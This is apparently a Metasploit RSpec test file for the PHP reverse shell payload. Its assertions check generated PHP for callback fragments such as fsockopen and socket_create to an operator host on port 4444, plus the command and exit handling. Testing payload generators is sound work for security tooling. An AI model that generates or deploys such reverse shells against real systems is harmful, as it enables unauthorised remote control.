require 'rspec'
require 'msfenv'
require 'msf/base'

RSpec.describe 'PHP reverse command shell generation' do
  subject(:payload) { payload_class.new }

  let(:payload_class) do
    scope = Module.new
    source = ENV.fetch('PHP_REVERSE_CONTRACT_SOURCE', File.expand_path('../../../../../modules/payloads/singles/php/reverse_php.rb', __dir__))
    scope.module_eval(File.binread(source), source)
    component = scope.const_get(:MetasploitModule)
    Class.new(Msf::Payload) { include component }
  end
  let(:generated) { payload.php_reverse_shell }

  before do
    payload.datastore['LHOST'] = '192.0.2.10'
    payload.datastore['LPORT'] = 4444
    # Keep layout stable at the generation boundary; PHP execution and both
    # real transports are exercised separately by the native interpreter probe.
    allow(Rex::Text).to receive(:randomize_space) { |source| source }
  end

  it 'returns an empty result for blank probes before the shared execution block' do
    expect(generated).to match(/function [a-zA-Z]+\(\$c\)\{\s*global \$dis;\s*if\(trim\(\$c\)===''\)\{\s*return '';\s*\}/)
  end

  it 'routes both transports through the same wrapper without trimming command bytes' do
    function = generated[/function ([a-zA-Z]+)\(\$c\)/, 1]
    expect(generated.scan("$out=#{function}(substr($c,0,-1));").length).to eq(2)
  end

  it 'retains both directory-change handlers' do
    expect(generated.scan('chdir(substr($c,3,-1));').length).to eq(2)
  end

  it 'retains exit and quit handling on both transports' do
    expect(generated.scan("substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit'").length).to eq(2)
  end

  it 'generates the configured IPv4 callback through the public generation API' do
    expect(payload.generate).to include("$ipaddr='192.0.2.10';", '$port=4444;', 'fsockopen("tcp://192.0.2.10",$port)', 'socket_create(AF_INET,SOCK_STREAM,SOL_TCP)')
  end

  it 'uses an IPv6 socket family and bracketed stream address' do
    payload.datastore['LHOST'] = '2001:db8::10'
    expect(generated).to include('fsockopen("tcp://[2001:db8::10]",$port)', 'socket_create(AF_INET6,SOCK_STREAM,SOL_TCP)')
  end

  it 'keeps the startup callback defaults when LHOST is absent' do
    payload.datastore['LHOST'] = nil
    payload.datastore['LPORT'] = 5555
    expect(generated).to include("$ipaddr='127.0.0.1';", '$port=4444;')
  end

  it 'keeps the startup callback defaults when LHOST is empty' do
    payload.datastore['LHOST'] = ''
    expect(generated).to include("$ipaddr='127.0.0.1';", '$port=4444;')
  end

  it 'preserves operator callback settings and their string object' do
    host = payload.datastore['LHOST']
    settings = payload.datastore.to_h.dup
    payload.php_reverse_shell
    expect(payload.datastore.to_h).to eq(settings)
    expect(payload.datastore['LHOST']).to equal(host)
  end
end
